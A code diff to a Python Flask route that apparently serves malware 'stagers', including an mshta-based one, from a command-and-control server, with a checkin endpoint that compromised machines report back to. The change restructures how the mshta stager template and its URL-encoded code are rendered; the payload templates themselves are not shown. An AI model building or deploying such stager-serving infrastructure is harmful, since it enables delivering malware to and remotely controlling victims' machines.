@@ -20,17 +20,20 @@ def serve_stagers(format_id):
     connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
     connection.system_information['ip'] = remote_addr
     if engine.connections[connection_id].stager.format == 'mshta':
-        code = parse.quote(render_template(f'stagers/mshta_code',
-                checkin_uri = checkin_uri,
-                connection_id = connection_id,
-                variables = engine.STAGERS[format_id].variables))
+        return render_template(
+            f'stagers/{engine.connections[connection_id].stager.format}',
+            checkin_uri = checkin_uri,
+            connection_id = connection_id,
+            variables = engine.STAGERS[format_id].variables,
+            code = parse.quote(render_template(f'stagers/mshta_code',
+                    checkin_uri = checkin_uri,
+                    connection_id = connection_id,
+                    variables = engine.STAGERS[format_id].variables)))
     return render_template(
         f'stagers/{engine.connections[connection_id].stager.format}',
         checkin_uri = checkin_uri,
         connection_id = connection_id,
-        variables = engine.STAGERS[format_id].variables,
-        code = code
-    )
+        variables = engine.STAGERS[format_id].variables,)
 
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
